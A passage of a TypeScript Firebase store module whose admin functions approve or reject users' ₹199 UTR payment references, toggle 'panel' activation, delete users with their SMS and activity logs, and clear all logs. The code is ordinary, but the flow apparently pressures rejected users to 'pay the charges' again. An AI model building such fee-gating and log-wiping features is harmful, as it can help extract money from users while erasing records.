          ? `Admin verified ₹199 UTR (${utrData?.utr || utrId}) and generated Payment Receipt for @${username}`
          : `Admin approved UTR (${utrData?.utr || utrId}) and started panel transactions for @${username}`,
        'activation',
        'success'
      );
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `utrs/${utrId}`);
      }
      return false;
    }
  },

  async adminRejectUtr(utrId: string, username: string) {
    try {
      const rejectMsg = 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
      await updateDoc(doc(db, 'utrs', utrId), { status: '❌ Rejected (Invalid UTR)' });
      const userObj = await findUserByIdentifier(username);
      if (userObj) {
        await updateDoc(doc(db, 'users', userObj.docId), {
          activated: false,
          activationStatus: 'rejected',
          rejectionMessage: rejectMsg,
        });
      }
      await writeActivityLog(username, 'withdrawal', `Admin rejected payment UTR (${utrId}) for @${username}. User prompted to pay charges.`, 'security', 'warning');
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `utrs/${utrId}`);
      }
      return false;
    }
  },

  async adminApproveUserPanel(username: string) {
    const userObj = await findUserByIdentifier(username);
    if (!userObj) return null;
    try {
      await updateDoc(doc(db, 'users', userObj.docId), {
        activated: true,
        activationStatus: 'approved',
        rejectionMessage: '',
      });
      await writeActivityLog(username, 'activation', `Admin approved & started panel transactions for @${username}`, 'activation', 'success');
      return { ...userObj, activated: true, activationStatus: 'approved' as const, rejectionMessage: '' };
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${userObj.docId}`);
      }
      return null;
    }
  },

  async adminRejectUserPayment(username: string) {
    const userObj = await findUserByIdentifier(username);
    if (!userObj) return null;
    const rejectMsg = 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
    try {
      await updateDoc(doc(db, 'users', userObj.docId), {
        activated: false,
        activationStatus: 'rejected',
        rejectionMessage: rejectMsg,
      });
      await writeActivityLog(username, 'withdrawal', `Admin rejected payment for @${username}. User prompted to pay charges and run.`, 'security', 'warning');
      return { ...userObj, activated: false, activationStatus: 'rejected' as const, rejectionMessage: rejectMsg };
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${userObj.docId}`);
      }
      return null;
    }
  },

  async adminToggleUserActivation(username: string, currentActivated: boolean) {
    const userObj = await findUserByIdentifier(username);
    if (!userObj) return null;
    const nextState = !currentActivated;
    const nextStatus = nextState ? 'approved' : 'rejected';
    const nextRejectMsg = nextState ? '' : 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
    try {
      await updateDoc(doc(db, 'users', userObj.docId), {
        activated: nextState,
        activationStatus: nextStatus,
        rejectionMessage: nextRejectMsg,
      });
      await writeActivityLog(
        username,
        'activation',
        `Admin updated panel status to ${nextState ? 'APPROVED & ACTIVE' : 'REJECTED'} for @${username}`,
        'activation',
        nextState ? 'success' : 'warning'
      );
      return { ...userObj, activated: nextState, activationStatus: nextStatus as 'approved' | 'rejected', rejectionMessage: nextRejectMsg };
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${userObj.docId}`);
      }
      return null;
    }
  },

  async adminDeleteUser(username: string) {
    const userObj = await findUserByIdentifier(username);
    if (!userObj) return false;
    try {
      await deleteDoc(doc(db, 'users', userObj.docId));

      const batch = writeBatch(db);
      const utrSnap = await getDocs(query(collection(db, 'utrs'), where('username', '==', username)));
      utrSnap.forEach((d) => batch.delete(d.ref));

      const logSnap = await getDocs(query(collection(db, 'activityLogs'), where('username', '==', username)));
      logSnap.forEach((d) => batch.delete(d.ref));

      const smsSnap = await getDocs(query(collection(db, 'smsLogs'), where('username', '==', username)));
      smsSnap.forEach((d) => batch.delete(d.ref));

      await batch.commit();
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.DELETE, `users/${userObj.docId}`);
      }
      return false;
    }
  },

  async adminClearLogs() {
    try {
      const snap = await getDocs(collection(db, 'activityLogs'));
      const batch = writeBatch(db);
      snap.forEach((d) => batch.delete(d.ref));
      await batch.commit();
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.DELETE, 'activityLogs');
      }
      return false;
    }
  },
};

declare global {
  interface Window {
    FirebaseStore: typeof FirebaseStore;
  }
}

window.FirebaseStore = FirebaseStore;
window.dispatchEvent(new CustomEvent('firebase-store-ready', { detail: FirebaseStore }));

export default FirebaseStore;
